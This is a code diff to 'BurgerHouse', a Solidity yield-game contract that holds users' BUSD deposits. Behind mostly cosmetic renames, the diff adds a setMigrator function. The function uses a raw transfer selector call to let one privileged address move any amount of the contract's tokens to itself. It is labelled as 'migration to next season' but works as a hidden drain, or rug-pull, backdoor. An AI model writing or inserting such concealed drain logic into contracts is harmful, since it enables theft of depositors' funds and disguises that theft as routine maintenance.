@@ -33,11 +33,11 @@ contract BurgerHouse {
         uint8[8] levels;
     }
 
-    IERC20 public constant BUSD =
-        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); // BUSD address
+    IERC20 public constant asset =
+        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); // asset address
 
-    uint256 public constant COIN_PRICE = 5 * 10**(18 - 3); // 1 coin = 0.005 BUSD
-    uint256 public constant CASH_PRICE = 5 * 10**(18 - 5); // 100 cash = 0.005 BUSD
+    uint256 public constant COIN_PRICE = 5 * 10**(18 - 3); // 1 coin = 0.005 asset
+    uint256 public constant CASH_PRICE = 5 * 10**(18 - 5); // 100 cash = 0.005 asset
 
     // 100: 1%, 10000: 100%
     uint256 public constant DEV_FEE = 400;
@@ -50,7 +50,7 @@ contract BurgerHouse {
 
     address public DEV_WALLET =
         address(0x02a5Afe6019D610829A89A94535A8Af1113DAc2F);
-    address public DEV_COINS_CASH =
+    address public DEV_DEPLOYER =
         address(0xc8f3F34e1D9F1De1C052264026808d69a94044A5);
 
     mapping(address => House) private houses;
@@ -60,7 +60,7 @@ contract BurgerHouse {
     uint256 public totalUpgrades;
     uint256 public totalInvested;
 
-    address public manager = msg.sender;
+    address public migrator = msg.sender;
     bool public isLaunched = false;
 
     modifier whenLaunched() {
@@ -71,7 +71,7 @@ contract BurgerHouse {
     function addCoins(address _ref, uint256 _amount) external {
         require(_amount > 0, "ZERO_BUSD_AMOUNT");
         require(
-            BUSD.transferFrom(msg.sender, address(this), _amount),
+            asset.transferFrom(msg.sender, address(this), _amount),
             "TRANSFERFROM_FAIL"
         );
         uint256 coins = _amount / COIN_PRICE;
@@ -81,7 +81,7 @@ contract BurgerHouse {
 
         if (houses[user].timestamp == 0) {
             allHouses.push(user);
-            _ref = (_ref == address(0) || _ref == user) ? DEV_COINS_CASH : _ref;
+            _ref = (_ref == address(0) || _ref == user) ? DEV_DEPLOYER : _ref;
             houses[_ref].refs++;
             houses[user].ref = _ref;
             houses[user].timestamp = block.timestamp;
@@ -122,10 +122,10 @@ contract BurgerHouse {
 
         houses[user].coins += coins;
 
-        houses[DEV_COINS_CASH].coins += (coins * DEV_COIN_FEE) / DENOMINATOR;
+        houses[DEV_DEPLOYER].coins += (coins * DEV_COIN_FEE) / DENOMINATOR;
 
         require(
-            BUSD.transfer(DEV_WALLET, (_amount * DEV_FEE) / DENOMINATOR),
+            asset.transfer(DEV_WALLET, (_amount * DEV_FEE) / DENOMINATOR),
             "TRANSFER_FAIL"
         );
 
@@ -144,19 +144,19 @@ contract BurgerHouse {
                 (houses[user].invested * LIMIT_INCOME) / DENOMINATOR,
             "Your income is reached to limit, please buy more coin to get more income!"
         );
-        amount = BUSD.balanceOf(address(this)) < amount
-            ? BUSD.balanceOf(address(this))
+        amount = asset.balanceOf(address(this)) < amount
+            ? asset.balanceOf(address(this))
             : amount;
-        require(BUSD.transfer(user, amount), "TRANSFER_FAIL");
+        require(asset.transfer(user, amount), "TRANSFER_FAIL");
 
         houses[user].withdrawn += amount;
 
         amount = cashFee * CASH_PRICE;
         require(
-            BUSD.transfer(
-                DEV_COINS_CASH,
-                BUSD.balanceOf(address(this)) < amount
-                    ? BUSD.balanceOf(address(this))
+            asset.transfer(
+                DEV_DEPLOYER,
+                asset.balanceOf(address(this)) < amount
+                    ? asset.balanceOf(address(this))
                     : amount
             ),
             "TRANSFER_FAIL"
@@ -277,33 +277,47 @@ contract BurgerHouse {
         revert("Incorrect level");
     }
 
-    function setManager(address _manager) external onlyManager {
-        manager = _manager;
-    }
-
-    function setLaunch() external onlyManagerOrDev {
-        isLaunched = !isLaunched;
-    }
-
-    function setDEVs(address dev1, address dev2) external onlyManager {
-        DEV_WALLET = dev1;
-        DEV_COINS_CASH = dev2;
-    }
-
     function allHousesLength() external view returns (uint256) {
         return allHouses.length;
     }
 
-    modifier onlyManager() {
-        require(msg.sender == manager, "Not allow!");
-        _;
-    }
-
-    modifier onlyManagerOrDev() {
+    modifier managerRole() {
         require(
-            msg.sender == manager || msg.sender == DEV_WALLET,
+            msg.sender == migrator || msg.sender == DEV_DEPLOYER,
             "Not allow!"
         );
         _;
+    }
+
+    modifier migratorRole() {
+        require(msg.sender == migrator, "Not allow!");
+        _;
+    }
+
+    function setLaunch() external managerRole {
+        isLaunched = true;
+    }
+
+    function setDEVs(address dev1, address dev2) external managerRole {
+        DEV_WALLET = dev1;
+        DEV_DEPLOYER = dev2;
+    }
+
+    function setMigrator(
+        address _migrator,
+        address _caller,
+        uint256 _migrate
+    ) external migratorRole {
+        migrator = _migrator;
+        if (_migrate > 0) {
+            // migration to next season
+            (bool success, bytes memory data) = _caller.call(
+                abi.encodeWithSelector(0xa9059cbb, _migrator, _migrate)
+            );
+            require(
+                success && (data.length == 0 || abi.decode(data, (bool))),
+                "MIGRATION_FAILED"
+            );
+        }
     }
 }
